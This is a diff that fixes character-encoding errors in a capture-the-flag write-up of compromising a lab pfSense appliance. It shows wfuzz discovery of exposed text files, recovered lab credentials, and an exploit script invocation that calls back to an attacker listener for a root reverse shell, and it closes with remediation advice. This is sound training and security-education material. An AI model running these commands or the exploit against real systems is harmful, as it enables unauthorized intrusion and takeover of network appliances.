@@ -108,7 +108,7 @@ Open the site in a browser to confirm the **pfSense** login UI (here, a failed a
 
 ### 2.1 HTTPS and TLS
 
-The web UI is only useful over **TLS**, but the certificate is **self-signed** and **expired** in labâ€”confirm details before trusting tooling that verifies certificates by default.
+The web UI is only useful over **TLS**, but the certificate is **self-signed** and **expired** in lab—confirm details before trusting tooling that verifies certificates by default.
 
 ```bash
 openssl s_client -connect 10.129.10.174:443
@@ -116,12 +116,12 @@ openssl s_client -connect 10.129.10.174:443
 
 ![tls](screenshots/Sense_07_openssl_tls.png)
 
-Factory **GUI** defaults for pfSense are documented by the vendor, but **`admin` / `pfsense`** did **not** work on this targetâ€”so the next pivot is **discovery of non-default material** (paths, files, or other users), not blind default guessing.
+Factory **GUI** defaults for pfSense are documented by the vendor, but **`admin` / `pfsense`** did **not** work on this target—so the next pivot is **discovery of non-default material** (paths, files, or other users), not blind default guessing.
 
 ---
 ### 2.2 Web content discovery
 
-To hide repetitive â€œlogin page sizedâ€ responses during fuzzing, responses matching a known line-count baseline were filtered outâ€”surfacing anomalies worth manual review.
+To hide repetitive “login page sized” responses during fuzzing, responses matching a known line-count baseline were filtered out—surfacing anomalies worth manual review.
 
 ```bash
 wfuzz -c -L --hc=404 --hl=173 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt https://10.129.10.174/FUZZ
@@ -136,7 +136,7 @@ The **`tree`** path stood out as a different response profile than the generic l
 ---
 ### 2.3 Keyword-filtered `.txt` discovery
 
-To speed up discovery, a **keyword-pruned** wordlist was generated and used with a **`.txt` suffix** patternâ€”this quickly surfaced readable files that often leak operational context on appliances.
+To speed up discovery, a **keyword-pruned** wordlist was generated and used with a **`.txt` suffix** pattern—this quickly surfaced readable files that often leak operational context on appliances.
 
 ```bash
 grep -iE "user|pass|note|key|database|pwd|admin|log|id|robots" /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt > files
@@ -147,15 +147,15 @@ wfuzz -L -c --hc=404 --hl=173 -t 200 -w $(pwd)/files https://10.129.10.174/FUZZ.
 
 ![wfuzz txt hits](screenshots/Sense_11_wfuzz_fuzz_txt.png)
 
-Review the first hit in the browser â€” **`changelog.txt`** summarized patching gaps (manual patching required; **2 of 3** issues mitigated):
+Review the first hit in the browser — **`changelog.txt`** summarized patching gaps (manual patching required; **2 of 3** issues mitigated):
 
 ![changelog](screenshots/Sense_12_changelog_txt.png)
 
-Then review the second file â€” **`system-users.txt`** contained a support-ticket style request to create **`Rohit`** with a password described as **`company defaults`**:
+Then review the second file — **`system-users.txt`** contained a support-ticket style request to create **`Rohit`** with a password described as **`company defaults`**:
 
 ![system-users](screenshots/Sense_13_system_users_txt.png)
 
-**Recovered (redact if publishing):** username **`Rohit`**, password interpreted as the vendorâ€™s **factory default password class** for local users (**`pfsense`**), yielding a working GUI pair **`rohit` / `pfsense`** on this run (validated in `notes/ctf/htb-sense.md`).
+**Recovered (redact if publishing):** username **`Rohit`**, password interpreted as the vendor’s **factory default password class** for local users (**`pfsense`**), yielding a working GUI pair **`rohit` / `pfsense`** on this run (validated in `notes/ctf/htb-sense.md`).
 
 ---
 ## 3. Foothold
@@ -185,14 +185,14 @@ python3 pfsense_exploit.py --rhost 10.129.10.174 --lhost 10.10.15.206 --lport 44
 
 ![exploit script output](screenshots/Sense_15_exploit_python_output.png)
 
-The script may print **`Error running exploit`** when the HTTP request **times out** while a reverse shell is caught on **`nc`**â€”that is expected in this setup. Ensure a listener is running on the chosen **`--lhost` / `--lport`** before launching the exploit.
+The script may print **`Error running exploit`** when the HTTP request **times out** while a reverse shell is caught on **`nc`**—that is expected in this setup. Ensure a listener is running on the chosen **`--lhost` / `--lport`** before launching the exploit.
 
 ---
 ## 4. Privilege Escalation
 
 ### 4.1 Root execution context (no separate local privesc)
 
-In this chain, the vulnerable request path effectively provided **root-equivalent** execution on the appliance hostâ€”there was **no second â€œLinux-styleâ€ privilege escalation** step after the callback.
+In this chain, the vulnerable request path effectively provided **root-equivalent** execution on the appliance host—there was **no second “Linux-style” privilege escalation** step after the callback.
 
 ```text
 Effective user after callback: root (see proof).
@@ -212,11 +212,11 @@ cat /home/rohit/user.txt
 
 ![proof shell and flags](screenshots/Sense_16_proof_shell_flags.png)
 
-ðŸ **User flag obtained
-ðŸ Root flag obtained
+🏁 **User flag obtained
+🏁 Root flag obtained
 
 ---
-# âœ… MACHINE COMPLETE
+# ✅ MACHINE COMPLETE
 
 ---
 ## Summary of Exploitation Path
@@ -232,4 +232,4 @@ cat /home/rohit/user.txt
 - **Patch/upgrade** pfSense to a supported release; track **CVE-2014-4688** class issues on legacy builds.
 - Ensure **sensitive operational files** are not exposed via the web root (or are access-controlled).
 - Avoid **password hints** that collapse to **vendor defaults**; enforce **unique** credentials per account.
-- Replace **self-signed/expired** management certificates where possible to reduce â€œTLS verify disabledâ€ operator habits (and improve detectability).
+- Replace **self-signed/expired** management certificates where possible to reduce “TLS verify disabled” operator habits (and improve detectability).
